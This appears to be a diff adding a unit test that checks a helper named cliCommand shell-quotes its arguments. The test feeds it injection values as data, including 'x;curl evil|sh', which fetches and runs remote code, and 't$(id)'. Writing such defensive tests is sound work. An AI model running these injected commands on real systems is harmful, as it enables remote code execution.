@@ -163,6 +163,16 @@ describe("helpers", () => {
     expect(out.split("\n")[4]).toBe("YAML_");
   });
 
+  test("cliCommand quotes a project or task with shell metacharacters", () => {
+    const out = cliCommand("x;curl evil|sh", "t$(id)", "n", "panels: []\n");
+    expect(out.split("\n").at(-1)).toBe(
+      "hx view add 't$(id)' --file /tmp/hx-view-n.yaml --name n -p 'x;curl evil|sh'",
+    );
+    expect(cliCommand("it's", "t", "n", "").split("\n").at(-1)).toBe(
+      `hx view add t --file /tmp/hx-view-n.yaml --name n -p 'it'"'"'s'`,
+    );
+  });
+
   test("isViewName and metricOf", () => {
     expect(["acc", "route_quality", "a-1"].map(isViewName)).toEqual([true, true, true]);
     expect(["", "overview", "Bad", "-x", "a b"].map(isViewName)).toEqual([false, false, false, false, false]);
